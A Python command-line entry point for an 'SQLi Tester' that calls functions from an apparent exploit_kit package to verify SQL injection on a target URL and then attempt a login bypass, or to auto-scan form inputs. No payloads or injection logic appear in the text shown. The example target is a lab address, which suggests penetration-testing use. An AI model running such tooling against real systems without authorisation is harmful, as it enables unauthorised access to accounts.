import argparse
import sys
from exploit_kit.scanner import verify_execution, bypass_login, run_scanner
from exploit_kit.client import APIClient

def main():
    parser = argparse.ArgumentParser(description="SQLi Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL(e.g., http://192.168.233.130)")
    parser.add_argument("-p", "--param", default=None, help="Target parameter name to inject (e.g., email, username)")
    args = parser.parse_args()

    print(f"[*] Target URL: {args.url}")

    try:
        client = APIClient(base_url=args.url)

        if args.param:
            print(f"[*] Inject Param (Manual Mode): {args.param}")
            is_vulnerable = verify_execution(client, target_param=args.param)
            if is_vulnerable:
                bypass_login(client, target_param=args.param)
            else:
                print("[!] SQL injection verification failed. Skipping login bypass attempts.")

        else:
            print("[*] Inject Param (Auto-Scan Mode): Parameter not specified. Scanning form input Automatically...")
            run_scanner(client)

    except ValueError as e:
        print(f"ValueError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
